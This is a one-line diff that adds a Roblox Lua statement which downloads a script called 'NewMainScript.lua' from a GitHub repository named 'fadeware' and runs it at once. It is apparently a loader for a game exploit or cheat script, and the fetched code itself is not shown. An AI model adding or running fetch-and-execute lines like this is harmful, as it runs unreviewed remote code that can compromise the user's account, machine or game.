@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/n7xRqLm4Wk9/fadeware/main/NewMainScript.lua", true))()
